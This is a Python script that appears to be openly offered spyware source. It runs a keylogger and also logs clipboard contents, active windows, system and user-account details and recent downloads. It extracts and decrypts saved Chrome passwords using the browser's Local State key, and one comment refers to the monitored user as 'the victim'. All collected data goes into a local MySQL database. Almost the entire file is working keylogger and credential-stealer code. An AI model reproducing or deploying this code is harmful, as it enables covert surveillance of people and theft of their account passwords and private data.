import subprocess
import os
import platform

import win32crypt

# Check and install required modules
required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']

for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.call([os.sys.executable, "-m", "pip", "install", module])

import time
import mysql.connector
from pynput import keyboard
from datetime import datetime
from threading import Timer
import pyperclip  # This module is used for clipboard operations
import socket
import base64
import json
import psutil
# import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import glob
import shutil
import sqlite3

# Connect to MySQL database
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",
    database="main_log"
)

cursor = db.cursor()

# Create the keystrokes table if not exists
create_keystrokes_table_query = """
CREATE TABLE IF NOT EXISTS keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    key_data VARCHAR(255) NOT NULL
)
"""

# Create the clipboard table if not exists
create_clipboard_table_query = """
CREATE TABLE IF NOT EXISTS clipboard (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    data VARCHAR(255) NOT NULL
)
"""

# Create the applications table if not exists
create_applications_table_query = """
CREATE TABLE IF NOT EXISTS applications (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    action VARCHAR(50) NOT NULL,
    app_name VARCHAR(255) NOT NULL
)
"""

# Create the system_info table if not exists
create_system_info_table_query = """
CREATE TABLE IF NOT EXISTS system_info (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    system_specifications TEXT,
    user_accounts TEXT,
    connected_devices TEXT
)
"""
# Create the downloads table if not exists
create_downloads_table_query = """
CREATE TABLE IF NOT EXISTS downloads (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    file_name VARCHAR(255) NOT NULL,
    file_path VARCHAR(255) NOT NULL
)
"""
# Create the chrome_passwords table if not exists
create_chrome_passwords_table_query = """
CREATE TABLE IF NOT EXISTS chrome_passwords (
    id INT AUTO_INCREMENT PRIMARY KEY,
    origin_url VARCHAR(255) NOT NULL,
    action_url VARCHAR(255) NOT NULL,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    creation_date DATETIME,
    last_used_date DATETIME
)
"""

try:
    cursor.execute(create_keystrokes_table_query)
    cursor.execute(create_clipboard_table_query)
    cursor.execute(create_applications_table_query)
    cursor.execute(create_system_info_table_query)
    cursor.execute(create_downloads_table_query)
    cursor.execute(create_chrome_passwords_table_query)

    db.commit()
except mysql.connector.Error as err:
    print(f"Error during table creation: {err}")
    pass  # Handle any errors that might occur during table creation

# Function to insert data into the appropriate table
def insert_data(data_type, data):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if data_type == "Keystroke":
            query = "INSERT INTO keystrokes (time, key_data) VALUES (%s, %s)"
        elif data_type == "Clipboard":
            query = "INSERT INTO clipboard (time, data) VALUES (%s, %s)"
        elif data_type == "Application":
            query = "INSERT INTO applications (time, action, app_name) VALUES (%s, %s, %s)"
        elif data_type == "SystemInfo":
            query = "INSERT INTO system_info (time, system_specifications, user_accounts, connected_devices) " \
                    "VALUES (%s, %s, %s, %s)"

        else:
            return

        values = (current_time, *data)
        cursor.execute(query, values)
        db.commit()
        print(f"Data inserted successfully: {data_type} - {data}")
    except mysql.connector.Error as err:
        print(f"Error insert data: {err}")
        with open("error_log.txt", "a") as error_log:
            error_log.write(f"{datetime.now()}: {err}\n")
        pass



# Function to start the keylogger
def start_keylogger():
    def on_press(key):
        try:
            insert_data("Keystroke", (f"{key.char}",))
        except AttributeError:
            insert_data("Keystroke", (f"{key}",))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to monitor clipboard
def monitor_clipboard():
    previous_clipboard_data = ""

    while True:
        clipboard_data = pyperclip.paste()

        if clipboard_data != previous_clipboard_data:
            insert_data("Clipboard", (clipboard_data,))
            previous_clipboard_data = clipboard_data
            time.sleep(1)

# Function to monitor application usage
def monitor_applications():
    active_application = ""

    while True:
        current_application = get_active_application()

        if current_application != active_application:
            if active_application:
                insert_data("Application", ("Closed", active_application))
            if current_application:
                insert_data("Application", ("Opened", current_application))

            active_application = current_application

# Function to gather system information
def gather_system_info():
    system_specifications = get_system_specifications()
    user_accounts = get_user_accounts()
    connected_devices = get_connected_devices()

    insert_data("SystemInfo", (system_specifications, user_accounts, connected_devices))

# Helper function to get system specifications
def get_system_specifications():
    specifications = f"System: {platform.system()} {platform.release()} {platform.architecture()}\n" \
                     f"Processor: {platform.processor()}\n" \
                     f"Machine: {platform.machine()}\n" \
                     f"Node: {platform.node()}\n" \
                     f"System Version: {platform.version()}"
    return specifications

# Helper function to get user accounts
def get_user_accounts():
    accounts = subprocess.run(
        ["net", "user"],
        capture_output=True,
        text=True
    ).stdout.strip()
    return accounts

# Helper function to get connected devices
def get_connected_devices():
    devices = ""
    for partition in psutil.disk_partitions():
        devices += f"Device: {partition.device}, Type: {partition.fstype}\n"
    return devices

# Helper function to get the active application
def get_active_application():
    if platform.system() == "Darwin":
        return subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to get name of first process whose frontmost is true'],
            capture_output=True,
            text=True
        ).stdout.strip()
    elif platform.system() == "Windows":
        return subprocess.run(
            ["powershell", "(Get-Process | Where-Object {$_.MainWindowTitle}).MainWindowTitle"],
            capture_output=True,
            text=True
        ).stdout.strip()
    elif platform.system() == "Linux":
        return subprocess.run(
            ["xdotool", "getactivewindow", "getwindowname"],
            capture_output=True,
            text=True
        ).stdout.strip()
    else:
        return ""

# Function to get the last 10 downloads of the victim
def get_last_10_downloads():
    downloads_path = os.path.expanduser("~") + "/Downloads/*"
    list_of_downloads = glob.glob(downloads_path)
    last_10_downloads = sorted(list_of_downloads, key=os.path.getctime, reverse=True)[:10]

    for download in last_10_downloads:
        file_name = os.path.basename(download)
        insert_download_data(file_name, download)
# Function to insert download data into the downloads table
def insert_download_data(file_name, file_path):
    try:

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        query = "INSERT INTO downloads (time, file_name, file_path) VALUES (%s, %s, %s)"
        values = (current_time, file_name, file_path)
        cursor.execute(query, values)
        db.commit()
        print(f"Download data inserted successfully: {file_name}")
    except mysql.connector.Error as err:
        print(f"Error insert download data: {err}")
        with open("error_log.txt", "a") as error_log:
            error_log.write(f"{datetime.now()}: {err}\n")
        pass


# Function to get chrome datetime
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


# Function to get the encryption key for Chrome passwords
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


# Function to decrypt Chrome passwords
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


# Function to insert chrome passwords data into the chrome_passwords table
def insert_chrome_password_data(origin_url, action_url, username, password, creation_date, last_used_date):
    try:
        query = "INSERT INTO chrome_passwords (origin_url, action_url, username, password, creation_date, last_used_date) " \
                "VALUES (%s, %s, %s, %s, %s, %s)"
        values = (origin_url, action_url, username, password, creation_date, last_used_date)
        cursor.execute(query, values)
        db.commit()
        print(f"Chrome passwords data inserted successfully for: {username}")
    except Exception as e:
        print(f"Error insert chrome passwords data: {e}")
        with open("error_log.txt", "a") as error_log:
            error_log.write(f"{datetime.now()}: {e}\n")
        pass


# Function to extract and insert chrome passwords into the database
def extract_and_insert_chrome_passwords():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                insert_chrome_password_data(origin_url, action_url, username, password,
                                            get_chrome_datetime(date_created), get_chrome_datetime(date_last_used))
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    except Exception as e:
        print(f"Error extracting chrome passwords: {e}")




# Set the time interval for keylogger data insertion (in seconds)
interval = 60.0

#Feature : 1
# Schedule the keylogger to run at the specified interval
keylogger_timer = Timer(interval, start_keylogger)
keylogger_timer.start()
#Feature : 2
# Start clipboard monitoring
clipboard_thread = Timer(interval, monitor_clipboard)
clipboard_thread.start()
#Feature : 3
# Start application monitoring
applications_thread = Timer(interval, monitor_applications)
applications_thread.start()
#Feature : 4
# Schedule the download data insertion to run at the specified interval
downloads_timer = Timer(interval, get_last_10_downloads)
downloads_timer.start()

#Feature : 5
# Gather system information at the beginning
gather_system_info()
# Schedule the system info gathering to run at a longer interval
system_info_timer = Timer(3600.0, gather_system_info)
system_info_timer.start()

#Feature : 6
# Schedule the chrome passwords extraction and insertion to run at the specified interval
chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
chrome_passwords_timer.start()
